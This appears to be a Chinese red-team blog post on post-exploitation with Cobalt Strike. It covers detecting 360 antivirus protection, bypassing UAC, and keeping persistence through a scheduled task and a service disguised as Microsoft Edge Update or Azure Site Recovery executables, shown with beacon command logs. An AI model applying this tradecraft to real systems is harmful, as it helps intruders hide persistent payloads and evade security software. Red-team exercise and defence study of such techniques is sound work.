
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.27.0" theme-name="Stellar" theme-version="1.27.0">
  
  <meta name="generator" content="Hexo 7.3.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" content="#f8f8f8">
  
  <title>后渗透操作 - Cber</title>

  
    <meta name="description" content="1.Find AVFind AV（利用CS完成）  若找到的杀软是360，需要查看是否开启了晶核，Start值为1则说明开启了核晶，维权后需要进行降级操作。 1234567891011shell reg query HKLM\SYSTEM\CurrentControlSet\services\360HvmHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\ser">
<meta property="og:type" content="article">
<meta property="og:title" content="后渗透操作">
<meta property="og:url" content="https://axusun01.github.io/2024/07/30/d9d69102/index.html">
<meta property="og:site_name" content="Cber">
<meta property="og:description" content="1.Find AVFind AV（利用CS完成）  若找到的杀软是360，需要查看是否开启了晶核，Start值为1则说明开启了核晶，维权后需要进行降级操作。 1234567891011shell reg query HKLM\SYSTEM\CurrentControlSet\services\360HvmHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\ser">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301633963.png">
<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301641032.png">
<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301646309.png">
<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301647881.png">
<meta property="og:image" content="c:\Users\23705\AppData\Roaming\Typora\typora-user-images\image-20240730165417505.png">
<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301654483.png">
<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301655301.png">
<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301658142.png">
<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301659881.png">
<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301659698.png">
<meta property="og:image" content="c:\Users\23705\AppData\Roaming\Typora\typora-user-images\image-20240730171158954.png">
<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301712607.png">
<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301712532.png">
<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301715698.png">
<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301716429.png">
<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301830567.png">
<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301833029.png">
<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301837445.png">
<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301838735.png">
<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301840152.png">
<meta property="article:published_time" content="2024-07-30T08:26:05.000Z">
<meta property="article:modified_time" content="2024-07-30T10:56:35.632Z">
<meta property="article:author" content="Cber">
<meta property="article:tag" content="攻防演练">
<meta property="article:tag" content="事件研判">
<meta property="article:tag" content="应急响应">
<meta property="article:tag" content="安全运营">
<meta property="article:tag" content="红队">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301633963.png">
  
  
  
  <meta name="keywords" content="攻防演练,事件研判,应急响应,安全运营,红队">

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="Cber" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.27.0">

  
    <link rel="shortcut icon" href="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407052027191.jpg">
  

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" /><link rel="stylesheet" href="/css/darkmode.css">
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="wiki" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407052027191.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">Cber</div><div class="sub normal cap">要问山下路</div><div class="sub hover cap" style="opacity:0"> 顺问过来人</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="探索" href="/notes/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a><a class="nav-item" title="更多" href="/tools/" style="color:#d55afa"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M22 12c0 5.523-4.477 10-10 10S2 17.523 2 12S6.477 2 12 2s10 4.477 10 10" opacity=".5"/><path fill="currentColor" d="M12.75 9a.75.75 0 0 0-1.5 0v2.25H9a.75.75 0 0 0 0 1.5h2.25V15a.75.75 0 0 0 1.5 0v-2.25H15a.75.75 0 0 0 0-1.5h-2.25z"/></svg></a></nav>
</div>
<div class="widgets"></div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/axusun01/" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-github"></i></a><a class="social" href="javaScript:hud.toast('你在听🎵啦啦啦~');" rel="noopener noreferrer"><i class="fa-solid fa-music"></i></a><a class="social" href="https://space.bilibili.com/476670117" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-bilibili fa-bounce"></i></a><a class="social" href="/atom.xml" rel="noopener noreferrer"><i class="fa-solid fa-rss fa-shake"></i></a><a class="social" href="/comments/" rel="noopener noreferrer"><i class="fa-regular fa-comment-dots"></i></a><a class="social" href="javaScript:void(0);" rel="noopener noreferrer"><i class="fa-solid fa-circle-half-stroke fa-flip"></i></a></div></footer>
</div></aside><div class="l_main" id="main">

<header class="header mobile-only"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407052027191.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">Cber</div><div class="sub normal cap">要问山下路</div><div class="sub hover cap" style="opacity:0"> 顺问过来人</div></a></div></header>



<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>

  <span class="sep"></span>
  <a class="cap breadcrumb" href="/2024/07/30/d9d69102/">后渗透操作</a>
  </div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-07-30T08:26:05.000Z">2024-07-30</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-07-30T10:56:35.632Z">2024-07-30</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>后渗透操作</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h1 id="1-Find-AV"><a href="#1-Find-AV" class="headerlink" title="1.Find AV"></a>1.Find AV</h1><p>Find AV（利用CS完成）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301633963.png" alt="image-20240730163327890"></p>
<p>若找到的杀软是360，需要查看是否开启了晶核，Start值为1则说明开启了核晶，维权后需要进行降级操作。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">shell reg query HKLM\SYSTEM\CurrentControlSet\services\360Hvm</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\360Hvm</span><br><span class="line">    Type    REG_DWORD    0x1</span><br><span class="line">    Start    REG_DWORD    0x4</span><br><span class="line">    ErrorControl    REG_DWORD    0x1</span><br><span class="line">    ImagePath    REG_SZ    System32\Drivers\360Hvm64.sys</span><br><span class="line">    DisplayName    REG_SZ    360Safe HVM</span><br><span class="line">    WorkConfig    REG_DWORD    0x1</span><br><span class="line">    Tag    REG_DWORD    0x0</span><br><span class="line">    extensionconfig    REG_DWORD    0x1</span><br></pre></td></tr></table></figure>

<p>降权操作参考注意事项。</p>
<h1 id="2-BypassUAC"><a href="#2-BypassUAC" class="headerlink" title="2.BypassUAC"></a>2.BypassUAC</h1><p>查看上线目标当前用户权限，以我本机测试为例。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell whoami /all</span><br><span class="line">[*] Tasked beacon to run: whoami /all</span><br><span class="line">[+] host called home, sent: 42 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">用户信息</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">用户名              SID                                           </span><br><span class="line">=================== ==============================================</span><br><span class="line">desktop-*****\*** S-1-5-21-13*****34-4117737026-312*****1670-1***</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">组信息</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">组名                                   类型   SID          属性                          </span><br><span class="line">====================================== ====== ============ ==============================</span><br><span class="line">Everyone                               已知组 S-1-1-0      必需的组, 启用于默认, 启用的组</span><br><span class="line">NT AUTHORITY\本地帐户和管理员组成员    已知组 S-1-5-114    只用于拒绝的组                </span><br><span class="line">BUILTIN\Administrators                 别名   S-1-5-32-544 只用于拒绝的组                </span><br><span class="line">BUILTIN\Performance Log Users          别名   S-1-5-32-559 必需的组, 启用于默认, 启用的组</span><br><span class="line">BUILTIN\Users                          别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组</span><br><span class="line">NT AUTHORITY\INTERACTIVE               已知组 S-1-5-4      必需的组, 启用于默认, 启用的组</span><br><span class="line">CONSOLE LOGON                          已知组 S-1-2-1      必需的组, 启用于默认, 启用的组</span><br><span class="line">NT AUTHORITY\Authenticated Users       已知组 S-1-5-11     必需的组, 启用于默认, 启用的组</span><br><span class="line">NT AUTHORITY\This Organization         已知组 S-1-5-15     必需的组, 启用于默认, 启用的组</span><br><span class="line">NT AUTHORITY\本地帐户                  已知组 S-1-5-113    必需的组, 启用于默认, 启用的组</span><br><span class="line">LOCAL                                  已知组 S-1-2-0      必需的组, 启用于默认, 启用的组</span><br><span class="line">NT AUTHORITY\NTLM Authentication       已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组</span><br><span class="line">Mandatory Label\Medium Mandatory Level 标签   S-1-16-8192                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">特权信息</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">特权名                        描述                 状态  </span><br><span class="line">============================= ==================== ======</span><br><span class="line">SeShutdownPrivilege           关闭系统             已禁用</span><br><span class="line">SeChangeNotifyPrivilege       绕过遍历检查         已启用</span><br><span class="line">SeUndockPrivilege             从扩展坞上取下计算机 已禁用</span><br><span class="line">SeIncreaseWorkingSetPrivilege 增加进程工作集       已禁用</span><br><span class="line">SeTimeZonePrivilege           更改时区             已禁用</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当前用户属于本地账户和管理员组，但是由于是Medium Mandatory Level，因此要想获取完整的权限需要bypassUAC</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301641032.png" alt="image-20240730164133995"></p>
<p>选择bypassUAC的时候执行的负载</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301646309.png" alt="image-20240730164600266"></p>
<p>不一会儿就会获得一个具有管理员权限的shell</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301647881.png" alt="image-20240730164700842"></p>
<p>如果目标用户不是管理员，先维持住这个目标的shell，后续在考虑单独提权。</p>
<h1 id="3-权限维持"><a href="#3-权限维持" class="headerlink" title="3.权限维持"></a>3.权限维持</h1><h2 id="3-1利用计划任务"><a href="#3-1利用计划任务" class="headerlink" title="3.1利用计划任务"></a>3.1利用计划任务</h2><p>将下列文件传输到目标机器，我们可以改动的只有output.lua和MicrosoftEdgeUpdateTask.exe的文件名。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="C:\Users\23705\AppData\Roaming\Typora\typora-user-images\image-20240730165417505.png" alt="image-20240730165417505"></p>
<p>创建计划任务去执行我们的MicrosoftEdgeUpdate32.exe</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301654483.png" alt="image-20240730165446419"></p>
<p>第一行填写计划任务名称，伪装一下。第二行是我们有效负载的路径。第三行是有效负载的参数，没有可以省略。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301655301.png" alt="image-20240730165508216"></p>
<p>由于伪造的是微软的Edge更新服务，因此可以将该负载保存到C:\Program Files (x86)\Microsoft\Edge\Application路径下。</p>
<p>确定计划任务创建成功。每天22点执行我们的有效负载。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[*] Pipe Name: \\.\pipe\8dceb61aff8c4c3d</span><br><span class="line">[+] host called home, sent: 19015 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">[+] Add Task Successfully!</span><br><span class="line"></span><br><span class="line">beacon&gt; shell schtasks /query /tn &quot;MicrosoftEdgeUpdateTask&quot;</span><br><span class="line">[*] Tasked beacon to run: schtasks /query /tn &quot;MicrosoftEdgeUpdateTask&quot;</span><br><span class="line">[+] host called home, sent: 76 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">文件夹: \</span><br><span class="line">任务名                                   下次运行时间           模式           </span><br><span class="line">======================================== ====================== ===============</span><br><span class="line">MicrosoftEdgeUpdateTask                  2024/3/8 22:00:00      就绪  </span><br></pre></td></tr></table></figure>

<p>清除我们的计划任务（<strong>不必要</strong>）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell schtasks /delete /tn &quot;MicrosoftEdgeUpdateTask&quot; /f</span><br><span class="line">[*] Tasked beacon to run: schtasks /delete /tn &quot;MicrosoftEdgeUpdateTask&quot; /f</span><br><span class="line">[+] host called home, sent: 80 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">成功: 计划的任务 &quot;MicrosoftEdgeUpdateTask&quot; 被成功删除。</span><br><span class="line"></span><br><span class="line">beacon&gt; shell schtasks /query /tn &quot;MicrosoftEdgeUpdateTask&quot;</span><br><span class="line">[*] Tasked beacon to run: schtasks /query /tn &quot;MicrosoftEdgeUpdateTask&quot;</span><br><span class="line">[+] host called home, sent: 76 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">错误: 系统找不到指定的文件。</span><br></pre></td></tr></table></figure>

<p>查看所有的计划任务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /query /fo LIST</span><br></pre></td></tr></table></figure>

<p>立即执行计划任务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /run /tn &quot;YourTaskName&quot;</span><br></pre></td></tr></table></figure>

<p>其他：</p>
<p>创建一个DataProtecionTask的计划任务，然后将可执行文件重命名位dataprotection.exe，</p>
<p><a target="_blank" rel="noopener" href="https://forums.ivanti.com/s/article/Application-Control-Files-to-exclude-for-Azure-Site-Recovery-software?language=en_US">参照下列可执行文件路径</a></p>
<p>c:\program files (x86)\microsoft azure site recovery\agent\dataprotection.exe</p>
<h2 id="3-2利用服务上传下列文件到目标机器的"><a href="#3-2利用服务上传下列文件到目标机器的" class="headerlink" title="3.2利用服务上传下列文件到目标机器的"></a>3.2利用服务上传下列文件到目标机器的</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301658142.png" alt="image-20240730165848094"></p>
<p>创建一个我们的服务来执行该有效负载EdgeUpdate.exe</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301659881.png" alt="image-20240730165923836"></p>
